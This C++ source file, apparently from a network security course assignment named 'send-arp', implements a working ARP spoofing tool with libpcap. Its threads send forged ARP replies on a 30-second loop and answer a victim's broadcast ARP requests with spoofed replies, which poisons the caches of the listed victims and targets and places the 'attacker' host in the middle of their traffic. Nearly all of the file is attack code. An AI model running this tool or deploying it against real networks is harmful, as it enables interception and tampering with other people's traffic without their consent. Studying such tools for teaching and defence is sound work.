#include "arpfunc.h"

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void makeArpPacket(EthArpPacket* packet, Mac eth_dmac, Mac eth_smac, Mac arp_tmac, Mac arp_smac, Ip arp_sip, Ip arp_tip, int flag)
{
	packet->eth_.dmac_ = eth_dmac;
	packet->eth_.smac_ = eth_smac;
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	if(flag == rep)
		packet->arp_.op_ = htons(ArpHdr::Reply);
	else
		packet->arp_.op_ = htons(ArpHdr::Request);
	packet->arp_.smac_ = arp_smac;
	packet->arp_.sip_ = htonl(arp_sip);
	packet->arp_.tmac_ = arp_tmac;
	packet->arp_.tip_ = htonl(arp_tip);
}

Mac getotherMac(pcap_t* inhandle, Ip tarip)
{
	u_int16_t* ethtype = NULL;
	u_int16_t* arppro = NULL;
	u_int32_t tip_x;
	u_int8_t mac_x[6] = {0x00};
	Ip tip;
	Mac mac;
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(inhandle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(inhandle));
			return 0;
		}
        ethtype = (u_int16_t*)(packet+12);
		arppro = (u_int16_t*)(packet+16);
        if(ntohs(*ethtype) == EthHdr::Arp && ntohs(*arppro) == EthHdr::Ip4)
		{
			memcpy(&tip_x, packet+28, Ip::SIZE);
			tip = Ip(ntohl(tip_x));
			if(tarip == tip)
			{
				mac_x[0] = *(packet+6); mac_x[1] = *(packet+7); mac_x[2] = *(packet+8);
				mac_x[3] = *(packet+9); mac_x[4] = *(packet+10); mac_x[5] = *(packet+11); 
				mac = mac_x;
				break;
			}
		}
	}
	return mac;
}

void send_thread(Attackerinfo* attacker, Node* victim, int victimnum, char* interface)
{
	char errbuf[PCAP_ERRBUF_SIZE];
    EthArpPacket packet;
    pcap_t* outhandle = pcap_open_live(interface, 0, 0, 0, errbuf);
	if (outhandle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		exit(-1);
	}
    while(1)
    {
		printf("Send: sending packet for keep connection...\n");
        for(int i =0;i<victimnum;i++)
        {
            makeArpPacket(&packet, victim[i].sender_mac, attacker->mac, victim[i].sender_mac, attacker->mac, victim[i].target_ip, victim[i].sender_ip, rep);
            int res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		    if (res != 0) {
			    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
		    }
        }
        sleep(30);
    }
}

void release_thread(Attackerinfo* attacker, Node* victim, int victimnum, char* interface)
{
	int res;
	EthArpPacket epacket;
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* outhandle = pcap_open_live(interface, 0, 0, 0, errbuf);
	if (outhandle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		exit(-1);
	}
	pcap_t* inhandle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	if (inhandle == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
		exit(-1);
	}
    u_int16_t* ethtype = NULL;
	u_int16_t* arppro = NULL;
	u_int8_t mac_x[6] = {0x00};
	Mac d_mac;
	u_int32_t sip_x;
	Ip sip;
	u_int32_t fake_ip_x;
	Ip fake_ip;
    while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(inhandle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(inhandle));
			exit(-1);
		}
        ethtype = (u_int16_t*)(packet+12);
		arppro = (u_int16_t*)(packet+16);
        if(ntohs(*ethtype) == EthHdr::Arp && ntohs(*arppro) == EthHdr::Ip4)
		{
			mac_x[0] = *(packet); mac_x[1] = *(packet+1); mac_x[2] = *(packet+2);
			mac_x[3] = *(packet+3); mac_x[4] = *(packet+4); mac_x[5] = *(packet+5);
			d_mac = mac_x;
			if(!d_mac.isBroadcast())
			{
				memcpy(&sip_x, packet+28, Ip::SIZE);
				sip = Ip(ntohl(sip_x));
				for(int i = 0;i<victimnum;i++)
				{
					printf("Release: IS IT VICTIM??\n");
					printf("%x\n", uint32_t(sip));
					if(victim[i].sender_ip == sip)
					{
						printf("Release: Yes...Make and Send fake packet to target\n");
						if(*(packet+21) == 0x01)
							makeArpPacket(&epacket, victim[i].target_mac, attacker->mac, victim[i].target_mac, attacker->mac, victim[i].sender_ip, victim[i].target_ip, req);
						else if(*(packet+21) == 0x02)
							makeArpPacket(&epacket, victim[i].target_mac, attacker->mac, victim[i].target_mac, attacker->mac, victim[i].sender_ip, victim[i].target_ip, rep);
						res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&epacket), sizeof(EthArpPacket));
						if (res != 0) {
							fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
						}
						break;
					}
				}
			}
		}
	}
}

void catch_thread(Attackerinfo* attacker, Node* victim, int victimnum, char* interface)
{
	int flag = 0;
	EthArpPacket epacket;
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* outhandle = pcap_open_live(interface, 0, 0, 0, errbuf);
	if (outhandle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		exit(-1);
	}
	pcap_t* inhandle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	if (inhandle == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface, errbuf);
		exit(-1);
	}
    u_int16_t* ethtype = NULL;
	u_int16_t* arppro = NULL;
	u_int8_t mac_x[6] = {0x00};
	Mac d_mac;
	u_int32_t tip_x;
	Ip tip;
	u_int32_t fake_ip_x;
	Ip fake_ip;
    while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(inhandle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(inhandle));
			exit(-1);
		}
        ethtype = (u_int16_t*)(packet+12);
		arppro = (u_int16_t*)(packet+16);
        if(ntohs(*ethtype) == EthHdr::Arp && ntohs(*arppro) == EthHdr::Ip4)
		{
			mac_x[0] = *(packet); mac_x[1] = *(packet+1); mac_x[2] = *(packet+2);
			mac_x[3] = *(packet+3); mac_x[4] = *(packet+4); mac_x[5] = *(packet+5);
			d_mac = mac_x;
			if(d_mac.isBroadcast())
			{
				printf("Catch: FIND Broadcast!! Is it victim?\n");
				mac_x[0] = *(packet+6); mac_x[1] = *(packet+7); mac_x[2] = *(packet+8);
				mac_x[3] = *(packet+9); mac_x[4] = *(packet+10); mac_x[5] = *(packet+11);
				d_mac = mac_x;
				memcpy(&tip_x, packet+28, Ip::SIZE);
				tip = Ip(ntohl(tip_x));
				for(int i = 0;i<victimnum;i++)
				{
					if(victim[i].sender_ip == tip)
					{
						flag = 1;
						break;
					}
				}
				if (flag == 0)
					continue;
				flag = 0;
				printf("Catch: Victim...Attack start!!\n");
				memcpy(&fake_ip_x, packet+38, Ip::SIZE);
				fake_ip = Ip(ntohl(fake_ip_x));
				makeArpPacket(&epacket, d_mac, attacker->mac, d_mac, attacker->mac, fake_ip, tip, rep);
				int res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&epacket), sizeof(EthArpPacket));
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
				}
			}
		}
	}
}